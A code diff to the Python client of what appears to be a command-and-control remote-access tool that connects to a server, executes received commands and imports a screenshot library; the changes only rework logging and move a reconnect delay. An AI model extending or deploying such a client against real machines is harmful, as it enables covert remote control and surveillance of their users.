@@ -14,9 +14,23 @@ from time import sleep
 
 import pyscreenshot as ImageGrab
 
+import utils
 from utils import C2Socket, RemoteDisconnected, Commands
 
-logging.getLogger().setLevel(logging.DEBUG)
+logger = logging.getLogger('client')
+logger.setLevel(logging.DEBUG)
+
+handler = logging.StreamHandler()
+handler.setLevel(logging.DEBUG)
+handler.setFormatter(
+    logging.Formatter('%(asctime)s %(name)s:%(levelname)s - %(filename)s:%(funcName)s:L%(lineno)d - %(message)s'))
+logger.addHandler(handler)
+
+handler = logging.StreamHandler()
+handler.setLevel(logging.DEBUG)
+handler.setFormatter(utils.formatter)
+utils.logger.addHandler(handler)
+
 DEFAULT_PORT = 8888
 
 
@@ -102,7 +116,6 @@ def main(srv_ip, srv_port):
                     command.execute()
     except RemoteDisconnected as err:
         logging.warning("Server disconnect : %s", err)
-        sleep(2)
     except ConnectionRefusedError:
         logging.warning("Cannot connect to %s:%s", srv_ip, srv_port)
     except BaseException as err:
@@ -121,6 +134,7 @@ if __name__ == '__main__':
         while True:
             for server_ip, server_port in ARGS.target:
                 main(server_ip, server_port)
+            sleep(2)
 
     except KeyboardInterrupt:
         logging.info("User cancel")
